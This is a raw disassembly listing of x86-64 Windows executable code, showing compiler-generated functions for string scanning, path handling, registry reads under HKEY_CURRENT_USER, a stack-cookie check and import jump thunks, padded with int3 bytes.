   14000963a:	c6 03 00             	movb   $0x0,(%rbx)
   14000963d:	eb 03                	jmp    0x140009642
   14000963f:	48 ff c7             	inc    %rdi
   140009642:	80 3f 20             	cmpb   $0x20,(%rdi)
   140009645:	74 f8                	je     0x14000963f
   140009647:	48 8b d5             	mov    %rbp,%rdx
   14000964a:	4c 8b c7             	mov    %rdi,%r8
   14000964d:	48 8b ce             	mov    %rsi,%rcx
   140009650:	e8 2f a1 ff ff       	call   0x140003784
   140009655:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000965a:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   14000965f:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   140009664:	48 83 c4 20          	add    $0x20,%rsp
   140009668:	5f                   	pop    %rdi
   140009669:	c3                   	ret
   14000966a:	cc                   	int3
   14000966b:	cc                   	int3
   14000966c:	cc                   	int3
   14000966d:	cc                   	int3
   14000966e:	cc                   	int3
   14000966f:	cc                   	int3
   140009670:	cc                   	int3
   140009671:	cc                   	int3
   140009672:	cc                   	int3
   140009673:	cc                   	int3
   140009674:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140009679:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000967e:	57                   	push   %rdi
   14000967f:	48 83 ec 20          	sub    $0x20,%rsp
   140009683:	33 f6                	xor    %esi,%esi
   140009685:	48 8b f9             	mov    %rcx,%rdi
   140009688:	48 83 ca ff          	or     $0xffffffffffffffff,%rdx
   14000968c:	48 ff c2             	inc    %rdx
   14000968f:	40 38 34 11          	cmp    %sil,(%rcx,%rdx,1)
   140009693:	75 f7                	jne    0x14000968c
   140009695:	48 03 d7             	add    %rdi,%rdx
   140009698:	48 ff 15 51 1f 00 00 	rex.W call *0x1f51(%rip)        # 0x14000b5f0
   14000969f:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400096a4:	48 8b d0             	mov    %rax,%rdx
   1400096a7:	eb 08                	jmp    0x1400096b1
   1400096a9:	80 3b 5c             	cmpb   $0x5c,(%rbx)
   1400096ac:	74 24                	je     0x1400096d2
   1400096ae:	48 8b d3             	mov    %rbx,%rdx
   1400096b1:	48 8b cf             	mov    %rdi,%rcx
   1400096b4:	48 ff 15 35 1f 00 00 	rex.W call *0x1f35(%rip)        # 0x14000b5f0
   1400096bb:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400096c0:	48 8b d8             	mov    %rax,%rbx
   1400096c3:	48 3b c7             	cmp    %rdi,%rax
   1400096c6:	77 e1                	ja     0x1400096a9
   1400096c8:	80 38 5c             	cmpb   $0x5c,(%rax)
   1400096cb:	75 36                	jne    0x140009703
   1400096cd:	48 3b c7             	cmp    %rdi,%rax
   1400096d0:	74 17                	je     0x1400096e9
   1400096d2:	48 8b d3             	mov    %rbx,%rdx
   1400096d5:	48 8b cf             	mov    %rdi,%rcx
   1400096d8:	48 ff 15 11 1f 00 00 	rex.W call *0x1f11(%rip)        # 0x14000b5f0
   1400096df:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400096e4:	80 38 3a             	cmpb   $0x3a,(%rax)
   1400096e7:	75 12                	jne    0x1400096fb
   1400096e9:	48 8b cb             	mov    %rbx,%rcx
   1400096ec:	48 ff 15 0d 1f 00 00 	rex.W call *0x1f0d(%rip)        # 0x14000b600
   1400096f3:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400096f8:	48 8b d8             	mov    %rax,%rbx
   1400096fb:	40 88 33             	mov    %sil,(%rbx)
   1400096fe:	be 01 00 00 00       	mov    $0x1,%esi
   140009703:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140009708:	8b c6                	mov    %esi,%eax
   14000970a:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   14000970f:	48 83 c4 20          	add    $0x20,%rsp
   140009713:	5f                   	pop    %rdi
   140009714:	c3                   	ret
   140009715:	cc                   	int3
   140009716:	cc                   	int3
   140009717:	cc                   	int3
   140009718:	cc                   	int3
   140009719:	cc                   	int3
   14000971a:	cc                   	int3
   14000971b:	cc                   	int3
   14000971c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009721:	48 89 74 24 10       	mov    %rsi,0x10(%rsp)
   140009726:	57                   	push   %rdi
   140009727:	48 83 ec 20          	sub    $0x20,%rsp
   14000972b:	80 39 00             	cmpb   $0x0,(%rcx)
   14000972e:	0f b7 f2             	movzwl %dx,%esi
   140009731:	48 8b d9             	mov    %rcx,%rbx
   140009734:	74 37                	je     0x14000976d
   140009736:	0f b7 3b             	movzwl (%rbx),%edi
   140009739:	40 3a fe             	cmp    %sil,%dil
   14000973c:	75 18                	jne    0x140009756
   14000973e:	40 8a cf             	mov    %dil,%cl
   140009741:	48 ff 15 e8 1b 00 00 	rex.W call *0x1be8(%rip)        # 0x14000b330
   140009748:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   14000974d:	85 c0                	test   %eax,%eax
   14000974f:	74 2f                	je     0x140009780
   140009751:	66 3b fe             	cmp    %si,%di
   140009754:	74 2a                	je     0x140009780
   140009756:	48 8b cb             	mov    %rbx,%rcx
   140009759:	48 ff 15 a0 1e 00 00 	rex.W call *0x1ea0(%rip)        # 0x14000b600
   140009760:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009765:	48 8b d8             	mov    %rax,%rbx
   140009768:	80 38 00             	cmpb   $0x0,(%rax)
   14000976b:	75 c9                	jne    0x140009736
   14000976d:	33 c0                	xor    %eax,%eax
   14000976f:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140009774:	48 8b 74 24 38       	mov    0x38(%rsp),%rsi
   140009779:	48 83 c4 20          	add    $0x20,%rsp
   14000977d:	5f                   	pop    %rdi
   14000977e:	c3                   	ret
   14000977f:	cc                   	int3
   140009780:	48 8b c3             	mov    %rbx,%rax
   140009783:	eb ea                	jmp    0x14000976f
   140009785:	cc                   	int3
   140009786:	cc                   	int3
   140009787:	cc                   	int3
   140009788:	cc                   	int3
   140009789:	cc                   	int3
   14000978a:	cc                   	int3
   14000978b:	cc                   	int3
   14000978c:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140009791:	48 89 6c 24 10       	mov    %rbp,0x10(%rsp)
   140009796:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   14000979b:	57                   	push   %rdi
   14000979c:	48 83 ec 20          	sub    $0x20,%rsp
   1400097a0:	33 ff                	xor    %edi,%edi
   1400097a2:	0f b7 ea             	movzwl %dx,%ebp
   1400097a5:	48 8b d9             	mov    %rcx,%rbx
   1400097a8:	40 38 39             	cmp    %dil,(%rcx)
   1400097ab:	74 3a                	je     0x1400097e7
   1400097ad:	0f b7 33             	movzwl (%rbx),%esi
   1400097b0:	40 3a f5             	cmp    %bpl,%sil
   1400097b3:	75 1b                	jne    0x1400097d0
   1400097b5:	40 8a ce             	mov    %sil,%cl
   1400097b8:	48 ff 15 71 1b 00 00 	rex.W call *0x1b71(%rip)        # 0x14000b330
   1400097bf:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400097c4:	85 c0                	test   %eax,%eax
   1400097c6:	74 05                	je     0x1400097cd
   1400097c8:	66 3b f5             	cmp    %bp,%si
   1400097cb:	75 03                	jne    0x1400097d0
   1400097cd:	48 8b fb             	mov    %rbx,%rdi
   1400097d0:	48 8b cb             	mov    %rbx,%rcx
   1400097d3:	48 ff 15 26 1e 00 00 	rex.W call *0x1e26(%rip)        # 0x14000b600
   1400097da:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400097df:	48 8b d8             	mov    %rax,%rbx
   1400097e2:	80 38 00             	cmpb   $0x0,(%rax)
   1400097e5:	75 c6                	jne    0x1400097ad
   1400097e7:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400097ec:	48 8b c7             	mov    %rdi,%rax
   1400097ef:	48 8b 6c 24 38       	mov    0x38(%rsp),%rbp
   1400097f4:	48 8b 74 24 40       	mov    0x40(%rsp),%rsi
   1400097f9:	48 83 c4 20          	add    $0x20,%rsp
   1400097fd:	5f                   	pop    %rdi
   1400097fe:	c3                   	ret
   1400097ff:	cc                   	int3
   140009800:	cc                   	int3
   140009801:	cc                   	int3
   140009802:	cc                   	int3
   140009803:	cc                   	int3
   140009804:	cc                   	int3
   140009805:	cc                   	int3
   140009806:	cc                   	int3
   140009807:	cc                   	int3
   140009808:	cc                   	int3
   140009809:	cc                   	int3
   14000980a:	cc                   	int3
   14000980b:	cc                   	int3
   14000980c:	cc                   	int3
   14000980d:	cc                   	int3
   14000980e:	cc                   	int3
   14000980f:	cc                   	int3
   140009810:	4c 8b 44 24 28       	mov    0x28(%rsp),%r8
   140009815:	b8 01 00 00 00       	mov    $0x1,%eax
   14000981a:	49 3b 50 08          	cmp    0x8(%r8),%rdx
   14000981e:	75 1c                	jne    0x14000983c
   140009820:	41 0f b7 c9          	movzwl %r9w,%ecx
   140009824:	ba ff 03 00 00       	mov    $0x3ff,%edx
   140009829:	66 23 ca             	and    %dx,%cx
   14000982c:	66 41 39 08          	cmp    %cx,(%r8)
   140009830:	75 0a                	jne    0x14000983c
   140009832:	41 89 40 04          	mov    %eax,0x4(%r8)
   140009836:	33 c0                	xor    %eax,%eax
   140009838:	66 45 89 08          	mov    %r9w,(%r8)
   14000983c:	c3                   	ret
   14000983d:	cc                   	int3
   14000983e:	cc                   	int3
   14000983f:	cc                   	int3
   140009840:	cc                   	int3
   140009841:	cc                   	int3
   140009842:	cc                   	int3
   140009843:	cc                   	int3
   140009844:	4c 8b dc             	mov    %rsp,%r11
   140009847:	49 89 5b 08          	mov    %rbx,0x8(%r11)
   14000984b:	49 89 73 10          	mov    %rsi,0x10(%r11)
   14000984f:	49 89 7b 18          	mov    %rdi,0x18(%r11)
   140009853:	4d 89 73 20          	mov    %r14,0x20(%r11)
   140009857:	55                   	push   %rbp
   140009858:	48 8b ec             	mov    %rsp,%rbp
   14000985b:	48 83 ec 40          	sub    $0x40,%rsp
   14000985f:	8b 1d 53 4a 00 00    	mov    0x4a53(%rip),%ebx        # 0x14000e2b8
   140009865:	48 8b 3d 44 67 00 00 	mov    0x6744(%rip),%rdi        # 0x14000ffb0
   14000986c:	83 fb fe             	cmp    $0xfffffffe,%ebx
   14000986f:	0f 85 88 00 00 00    	jne    0x1400098fd
   140009875:	33 f6                	xor    %esi,%esi
   140009877:	48 c7 45 f0 01 00 00 	movq   $0x1,-0x10(%rbp)
   14000987e:	00 
   14000987f:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   140009883:	89 35 2f 4a 00 00    	mov    %esi,0x4a2f(%rip)        # 0x14000e2b8
   140009889:	4c 8d 0d 80 ff ff ff 	lea    -0x80(%rip),%r9        # 0x140009810
   140009890:	49 89 43 d8          	mov    %rax,-0x28(%r11)
   140009894:	48 8b cf             	mov    %rdi,%rcx
   140009897:	44 8d 76 10          	lea    0x10(%rsi),%r14d
   14000989b:	8d 5e 01             	lea    0x1(%rsi),%ebx
   14000989e:	4c 89 75 f8          	mov    %r14,-0x8(%rbp)
   1400098a2:	44 8b c3             	mov    %ebx,%r8d
   1400098a5:	41 8b d6             	mov    %r14d,%edx
   1400098a8:	48 ff 15 29 1c 00 00 	rex.W call *0x1c29(%rip)        # 0x14000b4d8
   1400098af:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400098b4:	39 75 f4             	cmp    %esi,-0xc(%rbp)
   1400098b7:	75 3e                	jne    0x1400098f7
   1400098b9:	48 8d 45 f0          	lea    -0x10(%rbp),%rax
   1400098bd:	48 c7 45 f0 0d 00 00 	movq   $0xd,-0x10(%rbp)
   1400098c4:	00 
   1400098c5:	4c 8d 0d 44 ff ff ff 	lea    -0xbc(%rip),%r9        # 0x140009810
   1400098cc:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400098d1:	44 8b c3             	mov    %ebx,%r8d
   1400098d4:	4c 89 75 f8          	mov    %r14,-0x8(%rbp)
   1400098d8:	41 8b d6             	mov    %r14d,%edx
   1400098db:	48 8b cf             	mov    %rdi,%rcx
   1400098de:	48 ff 15 f3 1b 00 00 	rex.W call *0x1bf3(%rip)        # 0x14000b4d8
   1400098e5:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400098ea:	39 75 f4             	cmp    %esi,-0xc(%rbp)
   1400098ed:	75 08                	jne    0x1400098f7
   1400098ef:	8b 1d c3 49 00 00    	mov    0x49c3(%rip),%ebx        # 0x14000e2b8
   1400098f5:	eb 06                	jmp    0x1400098fd
   1400098f7:	89 1d bb 49 00 00    	mov    %ebx,0x49bb(%rip)        # 0x14000e2b8
   1400098fd:	48 8b 74 24 58       	mov    0x58(%rsp),%rsi
   140009902:	8b c3                	mov    %ebx,%eax
   140009904:	48 8b 5c 24 50       	mov    0x50(%rsp),%rbx
   140009909:	48 8b 7c 24 60       	mov    0x60(%rsp),%rdi
   14000990e:	4c 8b 74 24 68       	mov    0x68(%rsp),%r14
   140009913:	48 83 c4 40          	add    $0x40,%rsp
   140009917:	5d                   	pop    %rbp
   140009918:	c3                   	ret
   140009919:	cc                   	int3
   14000991a:	cc                   	int3
   14000991b:	cc                   	int3
   14000991c:	cc                   	int3
   14000991d:	cc                   	int3
   14000991e:	cc                   	int3
   14000991f:	cc                   	int3
   140009920:	48 8b c4             	mov    %rsp,%rax
   140009923:	48 89 58 08          	mov    %rbx,0x8(%rax)
   140009927:	48 89 70 10          	mov    %rsi,0x10(%rax)
   14000992b:	48 89 78 18          	mov    %rdi,0x18(%rax)
   14000992f:	55                   	push   %rbp
   140009930:	48 8d 68 a1          	lea    -0x5f(%rax),%rbp
   140009934:	48 81 ec 00 01 00 00 	sub    $0x100,%rsp
   14000993b:	48 8b 05 3e 47 00 00 	mov    0x473e(%rip),%rax        # 0x14000e080
   140009942:	48 33 c4             	xor    %rsp,%rax
   140009945:	48 89 45 47          	mov    %rax,0x47(%rbp)
   140009949:	33 d2                	xor    %edx,%edx
   14000994b:	48 8d 4d 9b          	lea    -0x65(%rbp),%rcx
   14000994f:	41 b8 90 00 00 00    	mov    $0x90,%r8d
   140009955:	e8 4c 82 ff ff       	call   0x140001ba6
   14000995a:	8b 35 5c 49 00 00    	mov    0x495c(%rip),%esi        # 0x14000e2bc
   140009960:	33 ff                	xor    %edi,%edi
   140009962:	48 89 7d 8f          	mov    %rdi,-0x71(%rbp)
   140009966:	89 7d 8b             	mov    %edi,-0x75(%rbp)
   140009969:	c7 45 87 0c 00 00 00 	movl   $0xc,-0x79(%rbp)
   140009970:	83 fe fe             	cmp    $0xfffffffe,%esi
   140009973:	0f 85 51 01 00 00    	jne    0x140009aca
   140009979:	48 8d 4d 97          	lea    -0x69(%rbp),%rcx
   14000997d:	89 3d 39 49 00 00    	mov    %edi,0x4939(%rip)        # 0x14000e2bc
   140009983:	c7 45 97 94 00 00 00 	movl   $0x94,-0x69(%rbp)
   14000998a:	48 ff 15 af 1a 00 00 	rex.W call *0x1aaf(%rip)        # 0x14000b440
   140009991:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009996:	85 c0                	test   %eax,%eax
   140009998:	0f 84 26 01 00 00    	je     0x140009ac4
   14000999e:	8d 77 01             	lea    0x1(%rdi),%esi
   1400099a1:	39 75 a7             	cmp    %esi,-0x59(%rbp)
   1400099a4:	0f 85 1a 01 00 00    	jne    0x140009ac4
   1400099aa:	83 7d 9b 04          	cmpl   $0x4,-0x65(%rbp)
   1400099ae:	0f 85 10 01 00 00    	jne    0x140009ac4
   1400099b4:	83 7d 9f 0a          	cmpl   $0xa,-0x61(%rbp)
   1400099b8:	0f 83 06 01 00 00    	jae    0x140009ac4
   1400099be:	8d 4f 4a             	lea    0x4a(%rdi),%ecx
   1400099c1:	48 ff 15 a0 1c 00 00 	rex.W call *0x1ca0(%rip)        # 0x14000b668
   1400099c8:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   1400099cd:	85 c0                	test   %eax,%eax
   1400099cf:	0f 84 ef 00 00 00    	je     0x140009ac4
   1400099d5:	48 8d 45 8f          	lea    -0x71(%rbp),%rax
   1400099d9:	41 b9 19 00 02 00    	mov    $0x20019,%r9d
   1400099df:	45 33 c0             	xor    %r8d,%r8d
   1400099e2:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   1400099e7:	48 8d 15 42 22 00 00 	lea    0x2242(%rip),%rdx        # 0x14000bc30
   1400099ee:	48 c7 c1 01 00 00 80 	mov    $0xffffffff80000001,%rcx
   1400099f5:	48 ff 15 0c 18 00 00 	rex.W call *0x180c(%rip)        # 0x14000b208
   1400099fc:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009a01:	85 c0                	test   %eax,%eax
   140009a03:	0f 85 bb 00 00 00    	jne    0x140009ac4
   140009a09:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140009a0d:	48 8d 45 87          	lea    -0x79(%rbp),%rax
   140009a11:	48 89 44 24 28       	mov    %rax,0x28(%rsp)
   140009a16:	4c 8d 4d 8b          	lea    -0x75(%rbp),%r9
   140009a1a:	48 8d 45 37          	lea    0x37(%rbp),%rax
   140009a1e:	45 33 c0             	xor    %r8d,%r8d
   140009a21:	48 8d 15 08 1e 00 00 	lea    0x1e08(%rip),%rdx        # 0x14000b830
   140009a28:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140009a2d:	48 ff 15 14 18 00 00 	rex.W call *0x1814(%rip)        # 0x14000b248
   140009a34:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009a39:	48 8b 4d 8f          	mov    -0x71(%rbp),%rcx
   140009a3d:	8b d8                	mov    %eax,%ebx
   140009a3f:	48 ff 15 12 18 00 00 	rex.W call *0x1812(%rip)        # 0x14000b258
   140009a46:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009a4b:	85 db                	test   %ebx,%ebx
   140009a4d:	75 75                	jne    0x140009ac4
   140009a4f:	4c 8d 45 37          	lea    0x37(%rbp),%r8
   140009a53:	41 8a 00             	mov    (%r8),%al
   140009a56:	2c 30                	sub    $0x30,%al
   140009a58:	3c 09                	cmp    $0x9,%al
   140009a5a:	77 0e                	ja     0x140009a6a
   140009a5c:	41 0f be 00          	movsbl (%r8),%eax
   140009a60:	83 c7 fd             	add    $0xfffffffd,%edi
   140009a63:	c1 e7 04             	shl    $0x4,%edi
   140009a66:	03 f8                	add    %eax,%edi
   140009a68:	eb 26                	jmp    0x140009a90
   140009a6a:	41 8a 00             	mov    (%r8),%al
   140009a6d:	2c 20                	sub    $0x20,%al
   140009a6f:	41 80 38 61          	cmpb   $0x61,(%r8)
   140009a73:	0f b6 d0             	movzbl %al,%edx
   140009a76:	41 0f b6 00          	movzbl (%r8),%eax
   140009a7a:	0f 4c d0             	cmovl  %eax,%edx
   140009a7d:	0f be ca             	movsbl %dl,%ecx
   140009a80:	8d 41 bf             	lea    -0x41(%rcx),%eax
   140009a83:	83 f8 05             	cmp    $0x5,%eax
   140009a86:	77 1c                	ja     0x140009aa4
   140009a88:	c1 e7 04             	shl    $0x4,%edi
   140009a8b:	83 c7 c9             	add    $0xffffffc9,%edi
   140009a8e:	03 f9                	add    %ecx,%edi
   140009a90:	49 8b c8             	mov    %r8,%rcx
   140009a93:	48 ff 15 66 1b 00 00 	rex.W call *0x1b66(%rip)        # 0x14000b600
   140009a9a:	0f 1f 44 00 00       	nopl   0x0(%rax,%rax,1)
   140009a9f:	4c 8b c0             	mov    %rax,%r8
   140009aa2:	eb af                	jmp    0x140009a53
   140009aa4:	48 8d 45 37          	lea    0x37(%rbp),%rax
   140009aa8:	4c 3b c0             	cmp    %rax,%r8
   140009aab:	74 17                	je     0x140009ac4
   140009aad:	81 e7 ff 03 00 00    	and    $0x3ff,%edi
   140009ab3:	3b fe                	cmp    %esi,%edi
   140009ab5:	74 05                	je     0x140009abc
   140009ab7:	83 ff 0d             	cmp    $0xd,%edi
   140009aba:	75 08                	jne    0x140009ac4
   140009abc:	89 35 fa 47 00 00    	mov    %esi,0x47fa(%rip)        # 0x14000e2bc
   140009ac2:	eb 06                	jmp    0x140009aca
   140009ac4:	8b 35 f2 47 00 00    	mov    0x47f2(%rip),%esi        # 0x14000e2bc
   140009aca:	8b c6                	mov    %esi,%eax
   140009acc:	48 8b 4d 47          	mov    0x47(%rbp),%rcx
   140009ad0:	48 33 cc             	xor    %rsp,%rcx
   140009ad3:	e8 d8 00 00 00       	call   0x140009bb0
   140009ad8:	4c 8d 9c 24 00 01 00 	lea    0x100(%rsp),%r11
   140009adf:	00 
   140009ae0:	49 8b 5b 10          	mov    0x10(%r11),%rbx
   140009ae4:	49 8b 73 18          	mov    0x18(%r11),%rsi
   140009ae8:	49 8b 7b 20          	mov    0x20(%r11),%rdi
   140009aec:	49 8b e3             	mov    %r11,%rsp
   140009aef:	5d                   	pop    %rbp
   140009af0:	c3                   	ret
   140009af1:	cc                   	int3
   140009af2:	cc                   	int3
   140009af3:	cc                   	int3
   140009af4:	cc                   	int3
   140009af5:	cc                   	int3
   140009af6:	cc                   	int3
   140009af7:	cc                   	int3
   140009af8:	48 83 ec 28          	sub    $0x28,%rsp
   140009afc:	4d 8b 41 38          	mov    0x38(%r9),%r8
   140009b00:	48 8b ca             	mov    %rdx,%rcx
   140009b03:	49 8b d1             	mov    %r9,%rdx
   140009b06:	e8 11 00 00 00       	call   0x140009b1c
   140009b0b:	b8 01 00 00 00       	mov    $0x1,%eax
   140009b10:	48 83 c4 28          	add    $0x28,%rsp
   140009b14:	c3                   	ret
   140009b15:	cc                   	int3
   140009b16:	cc                   	int3
   140009b17:	cc                   	int3
   140009b18:	cc                   	int3
   140009b19:	cc                   	int3
   140009b1a:	cc                   	int3
   140009b1b:	cc                   	int3
   140009b1c:	40 53                	rex push %rbx
   140009b1e:	45 8b 18             	mov    (%r8),%r11d
   140009b21:	48 8b da             	mov    %rdx,%rbx
   140009b24:	41 83 e3 f8          	and    $0xfffffff8,%r11d
   140009b28:	4c 8b c9             	mov    %rcx,%r9
   140009b2b:	41 f6 00 04          	testb  $0x4,(%r8)
   140009b2f:	4c 8b d1             	mov    %rcx,%r10
   140009b32:	74 13                	je     0x140009b47
   140009b34:	41 8b 40 08          	mov    0x8(%r8),%eax
   140009b38:	4d 63 50 04          	movslq 0x4(%r8),%r10
   140009b3c:	f7 d8                	neg    %eax
   140009b3e:	4c 03 d1             	add    %rcx,%r10
   140009b41:	48 63 c8             	movslq %eax,%rcx
   140009b44:	4c 23 d1             	and    %rcx,%r10
   140009b47:	49 63 c3             	movslq %r11d,%rax
   140009b4a:	4a 8b 14 10          	mov    (%rax,%r10,1),%rdx
   140009b4e:	48 8b 43 10          	mov    0x10(%rbx),%rax
   140009b52:	8b 48 08             	mov    0x8(%rax),%ecx
   140009b55:	48 8b 43 08          	mov    0x8(%rbx),%rax
   140009b59:	f6 44 01 03 0f       	testb  $0xf,0x3(%rcx,%rax,1)
   140009b5e:	74 0b                	je     0x140009b6b
   140009b60:	0f b6 44 01 03       	movzbl 0x3(%rcx,%rax,1),%eax
   140009b65:	83 e0 f0             	and    $0xfffffff0,%eax
   140009b68:	4c 03 c8             	add    %rax,%r9
   140009b6b:	4c 33 ca             	xor    %rdx,%r9
   140009b6e:	49 8b c9             	mov    %r9,%rcx
   140009b71:	5b                   	pop    %rbx
   140009b72:	e9 39 00 00 00       	jmp    0x140009bb0
   140009b77:	cc                   	int3
   140009b78:	cc                   	int3
   140009b79:	cc                   	int3
   140009b7a:	cc                   	int3
   140009b7b:	cc                   	int3
   140009b7c:	cc                   	int3
   140009b7d:	ff 25 ad 1b 00 00    	jmp    *0x1bad(%rip)        # 0x14000b730
   140009b83:	cc                   	int3
   140009b84:	cc                   	int3
   140009b85:	cc                   	int3
   140009b86:	cc                   	int3
   140009b87:	cc                   	int3
   140009b88:	cc                   	int3
   140009b89:	cc                   	int3
   140009b8a:	cc                   	int3
   140009b8b:	cc                   	int3
   140009b8c:	cc                   	int3
   140009b8d:	cc                   	int3
   140009b8e:	cc                   	int3
   140009b8f:	cc                   	int3
   140009b90:	cc                   	int3
   140009b91:	cc                   	int3
   140009b92:	cc                   	int3
   140009b93:	cc                   	int3
   140009b94:	cc                   	int3
   140009b95:	cc                   	int3
   140009b96:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009b9d:	00 00 00 
   140009ba0:	cc                   	int3
   140009ba1:	cc                   	int3
   140009ba2:	cc                   	int3
   140009ba3:	cc                   	int3
   140009ba4:	cc                   	int3
   140009ba5:	cc                   	int3
   140009ba6:	cc                   	int3
   140009ba7:	cc                   	int3
   140009ba8:	cc                   	int3
   140009ba9:	cc                   	int3
   140009baa:	cc                   	int3
   140009bab:	cc                   	int3
   140009bac:	cc                   	int3
   140009bad:	cc                   	int3
   140009bae:	cc                   	int3
   140009baf:	cc                   	int3
   140009bb0:	48 3b 0d c9 44 00 00 	cmp    0x44c9(%rip),%rcx        # 0x14000e080
   140009bb7:	75 10                	jne    0x140009bc9
   140009bb9:	48 c1 c1 10          	rol    $0x10,%rcx
   140009bbd:	66 f7 c1 ff ff       	test   $0xffff,%cx
   140009bc2:	75 01                	jne    0x140009bc5
   140009bc4:	c3                   	ret
   140009bc5:	48 c1 c9 10          	ror    $0x10,%rcx
   140009bc9:	e9 f2 79 ff ff       	jmp    0x1400015c0
   140009bce:	cc                   	int3
   140009bcf:	cc                   	int3
   140009bd0:	cc                   	int3
   140009bd1:	cc                   	int3
   140009bd2:	cc                   	int3
   140009bd3:	cc                   	int3
   140009bd4:	cc                   	int3
   140009bd5:	cc                   	int3
   140009bd6:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009bdd:	00 00 00 
   140009be0:	cc                   	int3
   140009be1:	cc                   	int3
   140009be2:	cc                   	int3
   140009be3:	cc                   	int3
   140009be4:	cc                   	int3
   140009be5:	cc                   	int3
   140009be6:	cc                   	int3
   140009be7:	cc                   	int3
   140009be8:	cc                   	int3
   140009be9:	cc                   	int3
   140009bea:	cc                   	int3
   140009beb:	cc                   	int3
   140009bec:	cc                   	int3
   140009bed:	cc                   	int3
   140009bee:	cc                   	int3
   140009bef:	cc                   	int3
   140009bf0:	ff 25 52 1b 00 00    	jmp    *0x1b52(%rip)        # 0x14000b748
   140009bf6:	cc                   	int3
   140009bf7:	cc                   	int3
   140009bf8:	cc                   	int3
   140009bf9:	cc                   	int3
   140009bfa:	cc                   	int3
   140009bfb:	cc                   	int3
   140009bfc:	cc                   	int3
   140009bfd:	cc                   	int3
   140009bfe:	cc                   	int3
   140009bff:	cc                   	int3
   140009c00:	cc                   	int3
   140009c01:	cc                   	int3
   140009c02:	cc                   	int3
   140009c03:	cc                   	int3
   140009c04:	cc                   	int3
   140009c05:	cc                   	int3
   140009c06:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009c0d:	00 00 00 
   140009c10:	cc                   	int3
   140009c11:	cc                   	int3
   140009c12:	cc                   	int3
   140009c13:	cc                   	int3
   140009c14:	cc                   	int3
   140009c15:	cc                   	int3
   140009c16:	cc                   	int3
   140009c17:	cc                   	int3
   140009c18:	cc                   	int3
   140009c19:	cc                   	int3
   140009c1a:	cc                   	int3
   140009c1b:	cc                   	int3
   140009c1c:	cc                   	int3
   140009c1d:	cc                   	int3
   140009c1e:	cc                   	int3
   140009c1f:	cc                   	int3
   140009c20:	ff e0                	jmp    *%rax
   140009c22:	cc                   	int3
   140009c23:	cc                   	int3
   140009c24:	cc                   	int3
   140009c25:	cc                   	int3
   140009c26:	cc                   	int3
   140009c27:	cc                   	int3
   140009c28:	cc                   	int3
   140009c29:	cc                   	int3
   140009c2a:	cc                   	int3
   140009c2b:	cc                   	int3
   140009c2c:	cc                   	int3
   140009c2d:	cc                   	int3
   140009c2e:	cc                   	int3
   140009c2f:	cc                   	int3
   140009c30:	cc                   	int3
   140009c31:	cc                   	int3
   140009c32:	cc                   	int3
   140009c33:	cc                   	int3
   140009c34:	cc                   	int3
   140009c35:	cc                   	int3
   140009c36:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   140009c3d:	00 00 00 
   140009c40:	cc                   	int3
   140009c41:	cc                   	int3
   140009c42:	cc                   	int3
   140009c43:	cc                   	int3
   140009c44:	cc                   	int3
   140009c45:	cc                   	int3
   140009c46:	cc                   	int3
   140009c47:	cc                   	int3
   140009c48:	cc                   	int3
   140009c49:	cc                   	int3
   140009c4a:	cc                   	int3
   140009c4b:	cc                   	int3
   140009c4c:	cc                   	int3
   140009c4d:	cc                   	int3
   140009c4e:	cc                   	int3
   140009c4f:	cc                   	int3
   140009c50:	ff 25 f2 1a 00 00    	jmp    *0x1af2(%rip)        # 0x14000b748
   140009c56:	cc                   	int3
   140009c57:	cc                   	int3
   140009c58:	cc                   	int3
   140009c59:	cc                   	int3
   140009c5a:	cc                   	int3
   140009c5b:	cc                   	int3
   140009c5c:	cc                   	int3
   140009c5d:	cc                   	int3
   140009c5e:	cc                   	int3
   140009c5f:	cc                   	int3
   140009c60:	40 55                	rex push %rbp
   140009c62:	48 83 ec 20          	sub    $0x20,%rsp
   140009c66:	48 8b ea             	mov    %rdx,%rbp
   140009c69:	48 8b 01             	mov    (%rcx),%rax
   140009c6c:	48 8b d1             	mov    %rcx,%rdx
   140009c6f:	8b 08                	mov    (%rax),%ecx
   140009c71:	e8 78 7c ff ff       	call   0x1400018ee
   140009c76:	90                   	nop
   140009c77:	48 83 c4 20          	add    $0x20,%rsp
   140009c7b:	5d                   	pop    %rbp
   140009c7c:	c3                   	ret
   140009c7d:	cc                   	int3
